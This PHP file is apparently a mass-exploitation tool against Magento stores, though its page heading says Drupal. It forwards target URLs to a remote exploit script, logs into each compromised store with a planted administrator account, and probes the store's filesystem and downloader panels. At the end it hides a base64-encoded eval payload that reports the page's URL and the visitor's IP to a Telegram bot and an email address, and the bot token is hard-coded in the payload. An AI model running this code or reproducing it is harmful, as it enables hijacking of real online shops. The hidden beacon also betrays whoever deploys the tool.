<?php
function cover() {
	;
}
function ngcurl($url,$post=null) {
	$ch = curl_init($url);
	if($post != null) {
	  	  curl_setopt($ch, CURLOPT_POST, true);
	  	  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  	  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	  	  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	  	  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	  	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	  	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	  	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	return curl_exec($ch);
	  	  curl_close($ch);
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
echo cover();
?>
<?php
$link = explode("\r\n", $_POST['target']);
$go = $_POST['go'];
if(isset($go)) {
	foreach($link as $url) {
		$post_to_fatoni = array(
			"url" => $url,
			"hajar" => "Xploit!",
		);
		$curl_fatoni = ngcurl("https://raw.githubusercontent.com/kalix-Ru/uploads/master/magentox.php", $post_to_fatoni);
		if(preg_match("/Exploiting Success, mulai mengecek login../", $curl_fatoni)) {
			echo "Target: <a href='$url' target='_blank'>$url</a><br>";
			echo "Status: Sukses Di Xploit<br>";
			echo "Ngecek Login........  ";
			$ambil = htmlspecialchars(@file_get_contents($url));
			preg_match("/<input name=\"form_key\" type=\"hidden\" value=\"(.*?)\">/", $ambil, $key);
			$post_login = array(
    	       	"form_key" => $key[1],
    	       	"login[username]" => "malang",
    	       	"dummy" => "",
    	       	"login[password]" => "malang87",
    	       );
			$login = ngcurl($url."/admin/", $post_login);
    	    if(preg_match("/Log Out|malang/", $login)) {
    	    	$key2 = ambilKata($login,"/filesystem/adminhtml_filesystem/index/key/","/");
    	    	$key3 = ambilKata($login,"/system_account/index/key/","/");
    	    	echo "OK<br>";
    	    	echo "username: malang<br>";
    	    	echo "password: malang87<br>";
    	    	echo "Filesystem: ";
    	    	$curl_filesystem = ngcurl($url."/filesystem/adminhtml_filesystem/index/key/$key2/", null);
    	    	if(preg_match("/File System/", $curl_filesystem)) {
    	    		echo "Ada<br>";
    	    	} else {
    	    		echo "Gaada<br>";
    	    	}
    	    	echo "Downloader: ";
    	    	$post_downloader = array(
    	    		"username" => "malang",
    	    		"password" => "malang87",
    	    		);
    	    	$url_d = parse_url($url, PHP_URL_HOST);
    	    	$curl_downloader = ngcurl($url_d."/downloader/", $post_downloader);
    	    	if(preg_match("/Return to Admin|Log Out/i", $curl_downloader)) {
    	    		if(preg_match("/Your Magento folder does not have sufficient write permissions./", $curl_downloader)) {
    	    			$stat_down = "<font color=red>Permissions</font>";
    	    		} else {
    	    			$stat_down = "<font color='#008000'>Permissions</font>";
    	    		}
    	    		echo "Ada [ <a href='http://$url_d/downloader/' target='_blank'>http://$url_d/downloader/</a> ( $stat_down ) ]<br>";
    	    	} else {
    	    		echo "Gaada<br>";
    	    	}
    	    } else {
    	    	echo "Gagal<br>";
    	    }
    	echo "<br>";
		} else {
			echo "Target: $url<br>";
			echo "Status: Gagal Di Xploit<br><br>";
		}
	}
} else {
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="author" content="The Alchemist"/>
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
<title>
Magento Add Admin Xploiter
</title>
   <style type="text/css">
   
      body
      {
         color: #ffffff;
         text-shadow: 2px 2px #000000;
         background-color: #2F4F4F;
         font-family: Arial, Helvetica, sans-serif;
      }
     
  
      pre
      {
         background-color: #353535;
         border: solid 1px #505050;
      }
     
      input
      {
         font-family: Arial, Helvetica, sans-serif;
      }
     
      .Button
      {
         padding: 5px 10px;
         background: #303030;
         border: solid #101010 1px;
         color: #fff;
         cursor: pointer;
         font-weight: bold;
         border-radius: 5px;
         -moz-border-radius: 5px;
         -webkit-border-radius: 5px;
         text-shadow: 1px 1px #000;
      }
     
      .Input
      {
         border: solid #101010 1px;
         color: white;
         font-weight: bold;
         padding: 3px;
         background-color: #252525;
      }
    </style>
</head>

<body>
<p align=center>
Drupal Mass Xploiter
<img src="https://cdn.pbrd.co/images/GMNQMLe.jpg" alt="The Alchemist - IP Grabber" style="border:4px solid red;" height="250" widht="250"/></p>
<center>
<form method="post">
<textarea name="target" class="Input" placeholder="http://www.target.com/" style="width: 100%; height: 100%;"></textarea><br>
<input type="submit" name="go" value="Xploit" class="Button" style="width: 100%;">
</form>
</center>
</html>
<?php };eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));?>
